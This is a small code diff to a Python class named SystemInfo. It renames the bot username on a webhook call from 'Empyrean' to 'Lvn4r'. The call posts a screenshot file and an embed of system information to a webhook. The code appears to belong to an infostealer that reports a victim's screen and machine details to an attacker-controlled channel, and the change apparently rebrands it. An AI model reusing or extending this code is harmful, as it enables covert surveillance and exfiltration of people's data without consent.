@@ -56,7 +56,7 @@ class SystemInfo():
             webhook.send(
                 embed=embed,
                 file=File('.\\screenshot.png', filename='screenshot.png'),
-                username="Empyrean",
+                username="Lvn4r",
                 avatar_url="https://i.imgur.com/HjzfjfR.png"
             )
         except:
